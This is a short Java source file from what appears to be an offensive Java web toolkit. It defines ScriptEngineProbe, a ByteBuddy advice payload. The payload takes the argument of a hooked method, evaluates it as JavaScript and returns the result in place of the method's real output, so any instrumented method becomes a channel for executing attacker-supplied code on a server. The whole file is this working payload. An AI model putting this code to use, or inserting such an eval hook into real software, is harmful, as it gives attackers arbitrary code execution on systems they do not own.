package com.reajason.javaweb.probe.payload;

import lombok.SneakyThrows;
import net.bytebuddy.asm.Advice;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

/**
 * @author ReaJason
 * @since 2025/11/18
 */
public class ScriptEngineProbe {
    private final String script;

    public ScriptEngineProbe(String script) {
        this.script = script;
    }

    @Advice.OnMethodExit
    public static String exit(@Advice.Argument(0) String data, @Advice.Return(readOnly = false) String ret) throws Exception {
        ScriptEngine js = new ScriptEngineManager().getEngineByName("js");
        if (js == null) {
            return ret = "js engine is null";
        }
        return ret = js.eval(data).toString();
    }

    @Override
    @SneakyThrows
    public String toString() {
        return ScriptEngineProbe.exit(script, super.toString());
    }
}
